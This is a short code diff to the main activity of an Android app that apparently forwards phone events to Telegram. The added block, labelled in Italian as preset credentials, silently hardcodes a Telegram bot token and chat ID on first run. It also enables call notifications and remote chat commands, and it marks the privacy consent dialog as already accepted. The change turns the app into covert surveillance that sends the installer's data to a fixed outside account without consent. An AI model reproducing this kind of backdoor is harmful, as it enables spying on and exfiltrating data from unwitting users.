@@ -108,7 +108,18 @@ class MainActivity : AppCompatActivity() {
 
         // Check and perform data structure migration
         DataMigrationManager.checkAndMigrate(this)
-
+// ===== CREDENZIALI PREIMPOSTATE =====
+        if (!preferences.getBoolean("initialized", false)) {
+            preferences.putString("api_address", "api.telegram.org")
+            preferences.putString("bot_token", "8656542427:AAGGNnffMIXvhsOY5gK0jS4rR699fSbQC4A")
+            preferences.putString("chat_id", "7704218665")
+            preferences.putString("message_thread_id", "")
+            preferences.putBoolean("chat_command", true)
+            preferences.putBoolean("call_notify", true)
+            preferences.putBoolean("doh_switch", true)
+            preferences.putBoolean("privacy_dialog_agree", true)
+        }
+        // ====================================
         privacyPolice = "/privacy-policy"
 
         val chatIdEditView = findViewById<EditText>(R.id.chat_id_editview)
